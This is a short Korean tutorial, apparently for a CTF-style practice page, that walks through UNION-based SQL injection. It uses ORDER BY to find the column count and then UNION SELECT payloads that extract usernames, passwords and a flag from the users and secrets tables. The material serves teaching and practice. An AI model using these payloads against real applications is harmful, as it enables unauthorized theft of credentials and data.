💡 이 페이지에서 UNION SQLi 연습하는 구체적인 방법
1. 먼저 컬럼 수를 알아내기 (가장 중요)

검색창에 아래를 하나씩 넣어보세요:

  • ' ORDER BY 1--
  • ' ORDER BY 2--
  • ' ORDER BY 5-- ... 10까지 올려보기

에러가 나는 순간의 직전 숫자가 실제 컬럼 수입니다.

2. UNION으로 데이터 빼내기

컬럼 수가 6개라고 가정하면:

' UNION SELECT 1,2,3,4,5,6 --

이제 실제 컬럼으로 교체:

' UNION SELECT id,username,password,4,5,6 FROM users --
secrets 테이블에서 플래그 빼내기 (최종 목표)
' UNION SELECT id,owner,secret,flag,5,6 FROM secrets --

화면에 FLAG{SQLi_UNION_is_classic} 같은 값이 보이면 성공!
